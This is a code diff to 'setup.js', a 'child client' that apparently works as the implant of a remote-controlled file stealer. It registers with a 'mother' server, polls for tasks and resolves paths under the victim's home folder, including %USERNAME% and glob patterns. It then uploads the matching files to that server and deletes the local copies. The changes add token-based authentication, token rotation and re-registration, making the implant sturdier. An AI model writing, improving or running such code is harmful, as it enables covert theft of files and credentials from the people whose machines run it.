@@ -1,4 +1,4 @@
-// setup.js – Dumb child client
+// setup.js – Dumb child client with token rotation
 require('dotenv').config();
 const axios = require('axios');
 const fs = require('fs');
@@ -16,28 +16,31 @@ if (!MOTHER_URL || !CHILD_BOT_TOKEN || !CHILD_CHAT_ID) {
     process.exit(1);
 }
 
+let authToken = null;
 let childId = null;
 let retryCount = 0;
 const MAX_RETRIES = 5;
 
 function expandPath(source) {
     let expanded = source.replace(/%USERNAME%/g, os.userInfo().username);
-    const fullPath = path.join(os.homedir(), expanded);
-    if (fullPath.includes('*')) {
-        const matches = glob.sync(fullPath);
+    if (!path.isAbsolute(expanded)) {
+        expanded = path.join(os.homedir(), expanded);
+    }
+    if (expanded.includes('*')) {
+        const matches = glob.sync(expanded);
         return matches.length > 0 ? matches[0] : null;
     }
-    return fullPath;
+    return expanded;
 }
 
-// Register with mother
 async function register() {
     try {
-        const res = await axios.post(`${MOTHER_URL}/register`, {
+        const res = await axios.post(`${MOTHER_URL}/api/register`, {
             token: CHILD_BOT_TOKEN,
             chatId: CHILD_CHAT_ID
         });
         childId = res.data.childId;
+        authToken = res.data.authToken;
         console.log(`✅ Registered. Child ID: ${childId}`);
         retryCount = 0;
         return true;
@@ -51,26 +54,35 @@ async function register() {
     }
 }
 
-// Heartbeat
 async function heartbeat() {
-    if (!childId) return;
+    if (!authToken) return;
     try {
-        await axios.post(`${MOTHER_URL}/heartbeat`, { childId });
+        const res = await axios.post(`${MOTHER_URL}/api/heartbeat`, {}, {
+            headers: { 'Authorization': `Bearer ${authToken}` },
+            timeout: 10000
+        });
+        if (res.data.newToken) authToken = res.data.newToken;
     } catch (err) {
-        // silent
+        if (err.response && err.response.status === 401) {
+            console.log('👋 Auth token invalid. Will re-register.');
+            authToken = null;
+        }
     }
 }
 setInterval(heartbeat, 60000);
 
 async function getTask() {
     try {
-        const res = await axios.get(`${MOTHER_URL}/task/${childId}`);
-        retryCount = 0;
+        const res = await axios.get(`${MOTHER_URL}/api/task`, {
+            headers: { 'Authorization': `Bearer ${authToken}` },
+            timeout: 10000
+        });
+        if (res.data.newToken) authToken = res.data.newToken;
         return res.data;
     } catch (err) {
-        if (err.response && err.response.status === 404) {
-            console.log('👋 Child not registered. Re-registering...');
-            childId = null;
+        if (err.response && err.response.status === 401) {
+            console.log('👋 Auth token invalid. Re-registering...');
+            authToken = null;
             return { type: 're-register' };
         }
         console.error('❌ Failed to get task:', err.message);
@@ -85,11 +97,25 @@ async function sendResult(filePath, caption, step) {
     }
     form.append('step', step);
     form.append('caption', caption);
-    await axios.post(`${MOTHER_URL}/result/${childId}`, form, {
-        headers: form.getHeaders()
-    });
+    
+    try {
+        const res = await axios.post(`${MOTHER_URL}/api/result`, form, {
+            headers: {
+                ...form.getHeaders(),
+                'Authorization': `Bearer ${authToken}`
+            },
+            timeout: 30000
+        });
+        if (res.data.newToken) authToken = res.data.newToken;
+        return true;
+    } catch (err) {
+        if (err.response && err.response.status === 401) {
+            console.log('👋 Auth token invalid during result upload. Will re-register.');
+            authToken = null;
+        }
+        throw err;
+    }
 }
-
 
 async function executeTask(task) {
     if (task.type === 'wait') {
@@ -116,8 +142,7 @@ async function executeTask(task) {
             console.log(`✅ Done: ${task.caption}`);
         } catch (err) {
             console.log(`⚠️ Send failed: ${err.message}`);
-            // retry later – mother will mark task as not done 
-            throw err; // let main handle retry
+            throw err;
         } finally {
             fs.unlinkSync(tempFile);
         }
@@ -128,7 +153,7 @@ async function main() {
     console.log('🚀 Child starting...');
     
     while (true) {
-        if (!childId) {
+        if (!authToken) {
             if (!await register()) {
                 retryCount++;
                 if (retryCount > MAX_RETRIES) {
@@ -141,7 +166,6 @@ async function main() {
             }
         }
 
-        
         try {
             const task = await getTask();
             if (!task) {
@@ -149,7 +173,7 @@ async function main() {
                 continue;
             }
             if (task.type === 're-register') {
-                childId = null;
+                authToken = null;
                 continue;
             }
             await executeTask(task);
